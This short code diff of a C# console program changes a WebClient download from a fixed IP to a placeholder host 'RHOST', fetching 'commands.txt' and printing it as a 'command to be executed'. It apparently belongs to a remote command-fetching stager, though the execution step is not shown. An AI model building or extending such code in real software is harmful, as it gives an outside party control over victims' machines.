@@ -16,7 +16,7 @@ namespace ConsoleApp3
         public static void Main(string[] args)
         {
             WebClient client = new WebClient();
-            var myString = client.DownloadString("http://10.54.3.85/string.txt");
+            var myString = client.DownloadString("http://RHOST/commands.txt");
             Console.WriteLine("Command to be executed: " + myString);
             
 
